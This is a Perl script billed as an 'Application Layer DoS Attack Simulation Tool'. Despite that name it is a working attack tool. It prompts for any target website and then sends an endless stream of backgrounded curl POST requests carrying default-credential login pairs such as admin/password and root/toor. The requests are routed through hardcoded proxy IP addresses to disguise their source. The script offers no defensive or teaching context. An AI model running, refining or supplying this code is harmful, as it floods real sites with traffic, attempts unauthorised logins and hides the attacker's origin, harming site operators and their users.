#!/usr/bin/perl
use strict;
use warnings;

# Define colors
my $RED = "\e[0;31m";
my $GREEN = "\e[0;32m";
my $NC = "\e[0m"; # No Color

# Array of payloads
my @payloads = (
    "username=admin&password=password",
    "username=root&password=123456",
    "username=test&password=test123",
    "username=admin&password=admin",
    "username=root&password=toor",
    "username=guest&password=guest",
    "username=admin&password=123456",
    "username=root&password=password",
    "username=test&password=password123",
    "username=admin&password=pass123",
    # Add more payloads here
);

# Array of proxy servers
my @proxy_servers = (
    "8.210.54.50:10081",
    "45.76.15.12:11969",
    "45.70.30.196:5566",
    "223.155.121.75:3128",
    "108.175.24.1:13135",
    # Add more proxy servers here
);

# Function to simulate Application Layer DoS Attack
sub simulate_application_layer_dos_attack {
    my ($target_url) = @_;
    print "${GREEN}Simulating Application Layer DoS Attack on $target_url ...${NC}\n";
    
    # Trap Ctrl+C to stop the attack
    $SIG{'INT'} = sub {
        print "\n${RED}DoS attack stopped.${NC}\n";
        exit;
    };

    # Infinite loop for continuous attack
    while (1) {
        # Select a random payload from the array
        my $random_index = int(rand(scalar @payloads));
        my $payload = $payloads[$random_index];

        # Select a random proxy server from the array
        my $random_proxy_index = int(rand(scalar @proxy_servers));
        my $proxy_server = $proxy_servers[$random_proxy_index];

        # Send HTTP POST request with the selected payload using the proxy server
        system("curl -s -X POST -d '$payload' -x '$proxy_server' '$target_url' &");
    }
}

# Main function
sub main {
    print "${GREEN}Application Layer DoS Attack Simulation Tool${NC}\n";
    print "${GREEN}--------------------------------------------${NC}\n";

    # Prompt the user to input the target website link
    print "${RED}Enter your target website link: ${NC}";
    my $target_url = <STDIN>;
    chomp($target_url);

    # Prompt the user to continue with the DoS attack
    print "${RED}Do you want to continue with the DoS attack? (y/n): ${NC}";
    my $continue_attack = <STDIN>;
    chomp($continue_attack);

    if (lc($continue_attack) eq 'y') {
        # Perform Application Layer DoS Attack Simulation
        simulate_application_layer_dos_attack($target_url);
    } else {
        print "${GREEN}DoS attack aborted.${NC}\n";
    }
}

# Call main function
main();
